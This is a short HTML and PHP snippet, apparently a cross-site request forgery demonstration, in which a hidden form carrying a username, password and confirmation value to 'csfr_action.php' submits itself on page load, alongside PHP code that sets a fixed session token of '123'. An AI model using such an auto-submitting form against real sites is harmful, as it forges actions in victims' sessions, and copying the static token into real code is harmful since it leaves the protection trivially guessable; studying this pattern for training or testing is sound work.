<form method="POST" action="csfr_action.php">
<input type="hidden" name ="username" value="host">
<input type="hidden" name ="password" value="pass">
<input type="hidden" name ="confirmation" value="123">

</form>
<script>
	document.forms[0].submit();
</script>

<?php
session_start();

$_SESSION["confirmation"] = "123";
?>


